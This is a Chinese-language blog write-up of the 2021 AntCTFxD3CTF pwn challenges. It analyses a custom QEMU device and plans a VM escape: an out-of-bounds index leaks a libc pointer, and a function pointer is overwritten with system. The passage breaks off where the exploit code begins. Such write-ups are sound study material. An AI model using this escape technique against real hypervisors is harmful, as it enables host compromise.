<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2021 AntCTFxD3CTF PWN WriteUp | LYYL' Blog</title><meta name="keywords" content="LYYL, Blog, Pwn, pwn"><meta name="author" content="LYYL"><meta name="copyright" content="LYYL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="d3dev这里没有加monitor&#x3D;&#x2F;dev&#x2F;null，所以可以直接通过CRTL_ALT_2进入控制台。 d3dev-revengeqemu逃逸 分析首先看一下启动脚本 123456789101112#!&#x2F;bin&#x2F;sh.&#x2F;qemu-system-x86_64 \-L pc-bios&#x2F; \-m 128M \-kernel vmlinuz \-initrd rootfs.img \-smp 1 \-a">
<meta property="og:type" content="article">
<meta property="og:title" content="2021 AntCTFxD3CTF PWN WriteUp">
<meta property="og:url" content="https://www.lyyl.online/posts/3469048985.html">
<meta property="og:site_name" content="LYYL&#39; Blog">
<meta property="og:description" content="d3dev这里没有加monitor&#x3D;&#x2F;dev&#x2F;null，所以可以直接通过CRTL_ALT_2进入控制台。 d3dev-revengeqemu逃逸 分析首先看一下启动脚本 123456789101112#!&#x2F;bin&#x2F;sh.&#x2F;qemu-system-x86_64 \-L pc-bios&#x2F; \-m 128M \-kernel vmlinuz \-initrd rootfs.img \-smp 1 \-a">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-62.jpeg">
<meta property="article:published_time" content="2021-03-07T12:06:17.000Z">
<meta property="article:modified_time" content="2022-05-26T07:56:59.322Z">
<meta property="article:author" content="LYYL">
<meta property="article:tag" content="LYYL, Blog, Pwn, pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-62.jpeg"><link rel="shortcut icon" href="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png"><link rel="canonical" href="https://www.lyyl.online/posts/3469048985"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-8740935439028405',
  enable_page_level_ads: 'true'
});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-MBZHBXMDJ2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MBZHBXMDJ2');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2021 AntCTFxD3CTF PWN WriteUp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-26 15:56:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-62.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">LYYL' Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2021 AntCTFxD3CTF PWN WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-03-07T12:06:17.000Z" title="undefined 2021-03-07 20:06:17">2021-03-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-WriteUp/">CTF WriteUp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>33分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2021 AntCTFxD3CTF PWN WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h2><p>这里没有加<code>monitor=/dev/null</code>，所以可以直接通过<code>CRTL_ALT_2</code>进入控制台。</p>
<h2 id="d3dev-revenge"><a href="#d3dev-revenge" class="headerlink" title="d3dev-revenge"></a>d3dev-revenge</h2><p><code>qemu逃逸</code></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先看一下启动脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-L pc-bios/ \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel vmlinuz \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-smp 1 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot;</span> \</span><br><span class="line">-device d3dev \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null</span><br></pre></td></tr></table></figure>

<p>我们看到这里的<code>device</code>的名称是<code>d3dev</code>，<code>ida</code>看一下相关的函数，发现存在<code>mmio/pmio</code>两种方式，分别分析一下，首先看一下<code>pmio_read</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">d3dev_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x18</span> )</span><br><span class="line">    result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = ((__int64 (__fastcall *)(<span class="type">void</span> *))((<span class="type">char</span> *)dword_7ADF30 + dword_7ADF30[addr]))(opaque);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里看发生了一个未知的调用，采用的应该是函数表的形式，不过这里不重要，接下来看一下<code>pmio_write</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr cmd, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;                       <span class="comment">// 设定seek</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( cmd &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">0x1C</span> )                          <span class="comment">// 随机生成key</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(<span class="type">uint32_t</span> *, __int64, <span class="type">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  <span class="number">0x1C</span>LL,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( v4 != (<span class="type">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">4</span> )                             <span class="comment">// 清空两个key</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里涉及到了<code>d3devState</code>数据结构，看一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> d3devState      struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1300</span>, align=<span class="number">0x10</span>, copyof_4545)</span><br><span class="line"><span class="number">00000000</span> pdev            PCIDevice_0 ?</span><br><span class="line"><span class="number">000008E0</span> mmio            MemoryRegion_0 ?</span><br><span class="line"><span class="number">000009</span>D0 pmio            MemoryRegion_0 ?</span><br><span class="line"><span class="number">00000</span>AC0 memory_mode     dd ?</span><br><span class="line"><span class="number">00000</span>AC4 seek            dd ?</span><br><span class="line"><span class="number">00000</span>AC8 init_flag       dd ?</span><br><span class="line"><span class="number">00000</span>ACC mmio_read_part  dd ?</span><br><span class="line"><span class="number">00000</span>AD0 mmio_write_part dd ?</span><br><span class="line"><span class="number">00000</span>AD4 r_seed          dd ?</span><br><span class="line"><span class="number">00000</span>AD8 blocks          dq <span class="number">257</span> dup(?)</span><br><span class="line"><span class="number">000012E0</span> key             dd <span class="number">4</span> dup(?)</span><br><span class="line"><span class="number">000012F</span>0 rand_r          dq ?                    ; offset</span><br><span class="line"><span class="number">000012F</span>8                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>9                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>A                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>B                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>C                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>D                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>E                 db ? ; undefined</span><br><span class="line"><span class="number">000012F</span>F                 db ? ; undefined</span><br><span class="line"><span class="number">00001300</span> d3devState      ends</span><br></pre></td></tr></table></figure>

<p>这里是根据<code>cmd</code>的值来达到不同的功能</p>
<ul>
<li><code>cmd=8</code>，设定<code>seek</code>的值，这里的<code>seek&lt;0x100</code></li>
<li><code>cmd=0x1c</code>，更新加解密所需要的<code>key</code>，这里是直接调用的数据结构中的<code>rand_r</code>函数指针来完成的</li>
<li><code>cmd=4</code>，这里清空了<code>key</code>，所有的<code>key</code>均为<code>0</code>，注意到这里其实我们就可以实现加解密了，因为所有的<code>key</code>都是<code>0</code></li>
</ul>
<p>接下来看一下<code>mmio_read</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> v; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> sum; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">uint64_t</span> v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v = opaque-&gt;blocks[opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  sum = <span class="number">0xC6EF3720</span>;</span><br><span class="line">  v1 = v;</span><br><span class="line">  v0 = HIDWORD(v);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = v0 - ((v1 + sum) ^ (opaque-&gt;key[<span class="number">3</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v1));</span><br><span class="line">    v1 -= (v0 + sum) ^ (opaque-&gt;key[<span class="number">1</span>] + ((<span class="type">unsigned</span> <span class="type">int</span>)v0 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * v0);</span><br><span class="line">    sum += <span class="number">0x61C88647</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( sum );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    v0 = (<span class="type">unsigned</span> <span class="type">int</span>)v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    v0 = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里是根据输入的<code>addr&gt;&gt;3</code>作为<code>offset</code>读取<code>blocks</code>中的相关内容，读取的内容进行了加密处理，很容易可以看出来这里的加密算法是<code>tea</code>的解密算法。<code>tea</code>的加解密算法可以参考<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.jianshu.com/p/4272e0805da3">这里</a></p>
<p>需要注意的这里需要读取两次才能够获得完整的加密<code>8</code>字节数据。接下来看一下<code>mmio_write</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 offset; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **opaque_address; <span class="comment">// r11</span></span><br><span class="line">  <span class="type">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">uint32_t</span> key0; <span class="comment">// er10</span></span><br><span class="line">  <span class="type">uint32_t</span> key1; <span class="comment">// er9</span></span><br><span class="line">  <span class="type">uint32_t</span> key2; <span class="comment">// er8</span></span><br><span class="line">  <span class="type">uint32_t</span> key3; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    offset = opaque-&gt;seek + (<span class="type">unsigned</span> <span class="type">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque_address = &amp;opaque-&gt;pdev.qdev.parent_obj.class + offset;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      key0 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      key1 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      key2 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      key3 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *((_DWORD *)opaque_address + <span class="number">0x2B6</span>);</span><br><span class="line">      result = ((<span class="type">unsigned</span> __int64)opaque_address[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v12 += (v7 + result) ^ (key1 + ((<span class="type">unsigned</span> <span class="type">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (key0 + <span class="number">16</span> * result);</span><br><span class="line">        LODWORD(result) = ((v7 + v12) ^ (key3 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (key2 + <span class="number">16</span> * v12)) + result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );</span><br><span class="line">      opaque_address[<span class="number">0x15B</span>] = (ObjectClass_0 *)__PAIR64__(result, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[offset] = (<span class="type">unsigned</span> <span class="type">int</span>)val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里与<code>mmio_read</code>类似，虽然这里的<code>ida</code>反汇编显示有点问题，但是根据调试可以知道这里的功能就是将用户输入的数据进行解密。解密算法就是<code>tea</code>的加密算法（反向理解也可以，写入加密，读取解密）将解密后的数据写入到<code>blocks[seek+offset]</code>中。这里也提供了直接写入的 分支，不过只能写入四子节。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>这里可以很明显的发现一个索引越界漏洞，即<code>seek</code>最大为<code>0x100</code>，但是对用户输入的<code>offset</code>没有进行限制，而<code>blocks</code>的大小为<code>0x101</code>，也就是这里可以直接越界对<code>d3devState</code>结构体进行读写。</p>
<p>很容易的我们发现可以读取器中的<code>rand_r</code>函数指针泄漏出<code>libc</code>的基址，进而得到<code>system</code>的地址，然后可以将<code>rand_r</code>函数指针覆写为<code>system</code>，之后在进行<code>pmio_write</code>中调用<code>rand_r</code>函数指针即可执行命令。</p>
<p>按照后门函数的调用逻辑，命令参数只能写到<code>seed</code>的位置，而注意到<code>seed</code>和<code>blocks</code>位置相邻，因此我们可以利用字符串拼接的方法执行任意长度的<code>cmd</code>，这里将<code>seed</code>写为<code>ls &amp;</code>而真正执行的命令在<code>blocks[0]</code>位置处。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 